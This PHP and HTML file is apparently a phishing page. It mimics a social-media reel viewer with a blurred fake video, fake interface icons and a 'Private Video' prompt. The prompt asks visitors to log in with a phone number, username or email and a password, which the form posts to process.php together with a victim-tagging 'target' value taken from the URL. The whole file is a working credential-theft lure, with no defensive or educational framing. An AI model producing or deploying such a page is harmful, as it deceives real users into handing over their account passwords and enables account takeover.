<?php
$target = isset($_GET['target']) ? $_GET['target'] : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Reel | Login Required</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            position: relative;
            background-color: #111;
        }

        /* Fake Video Background (blurred) */
        .video-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=400&auto=format&fit=crop'); /* Placeholder */
            background-size: cover;
            background-position: center;
            filter: blur(8px) brightness(0.4);
            z-index: 1;
        }

        /* UI Overlay */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .login-box {
            background: rgba(0, 0, 0, 0.75);
            padding: 30px 25px;
            border-radius: 12px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
        }

        .icon {
            font-size: 40px;
            margin-bottom: 15px;
        }

        h2 {
            margin: 0 0 10px;
            font-size: 20px;
            font-weight: 600;
        }

        p {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }

        input:focus {
            outline: none;
            border-color: #0095f6;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background: #0081d6;
        }

        .social-icons {
            margin-bottom: 15px;
            display: flex;
            justify-content: center;
            gap: 15px;
        }
        
        /* Fake Reel UI Elements */
        .fake-ui-right {
            position: absolute;
            right: 15px;
            bottom: 100px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            z-index: 1;
        }
        
        .fake-icon {
            width: 35px;
            height: 35px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
        }

    </style>
</head>
<body>

<div class="container">
    <div class="video-bg"></div>
    
    <div class="fake-ui-right">
        <div class="fake-icon"></div>
        <div class="fake-icon"></div>
        <div class="fake-icon"></div>
    </div>

    <div class="overlay">
        <div class="login-box">
            <div class="social-icons">
               <span style="font-size: 24px;">🔒</span>
            </div>
            <h2>Private Video</h2>
            <p>Please log in to your account to view this private content.</p>
            
            <form action="process.php" method="POST">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In to Watch</button>
            </form>
        </div>
    </div>
</div>

</body>
</html>
